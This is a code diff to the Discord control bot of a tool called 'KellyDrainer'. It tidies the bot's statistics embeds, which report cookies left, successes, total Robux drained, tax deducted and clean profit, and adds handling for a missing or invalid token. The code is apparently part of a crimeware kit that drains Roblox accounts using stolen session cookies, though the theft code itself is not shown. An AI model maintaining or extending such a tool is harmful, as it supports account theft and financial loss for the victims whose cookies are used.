@@ -4,6 +4,9 @@ import time, discord
 from datetime import datetime
 
 def start_bot(token):
+    if not token:
+        return
+
     intents = discord.Intents.all()
     bot = commands.Bot(command_prefix='$', intents=intents)
 
@@ -22,12 +25,12 @@ def start_bot(token):
             color=0xFFFFFF,
             timestamp=datetime.utcnow()
         )
-        embed.add_field(name="🍪 Cookies Left", value=f"`{utils._total_cookies}`", inline=True)
-        embed.add_field(name="✅ Successes", value=f"`{utils._total_tries}`", inline=True)
-        embed.add_field(name="💸 Total Drained", value=f"**{utils._total_robux} R$**", inline=False)
-        embed.add_field(name="⏳ Uptime", value=f"`{h}h {m}m {s}s`", inline=True)
+        embed.add_field(name="Cookies Left", value=f"`{utils._total_cookies}`", inline=True)
+        embed.add_field(name="Successes", value=f"`{utils._total_tries}`", inline=True)
+        embed.add_field(name="Total Drained", value=f"**{utils._total_robux} R$**", inline=False)
+        embed.add_field(name="Uptime", value=f"`{h}h {m}m {s}s`", inline=True)
         embed.set_footer(text="KellyDrainer")
-        
+
         await ctx.send(embed=embed)
 
     @bot.command()
@@ -45,7 +48,10 @@ def start_bot(token):
         embed.add_field(name="📉 Tax Deducted", value=f"`{tax_taken} R$`", inline=True)
         embed.add_field(name="💸 Clean Profit", value=f"`{clean} R$`", inline=False)
         embed.set_footer(text="KellyDrainer")
-        
+
         await ctx.send(embed=embed)
 
-    bot.run(token)
+    try:
+        bot.run(token)
+    except discord.errors.LoginFailure:
+        utils.log("[!]", "Invalid bot token, running without bot...", utils.RED)
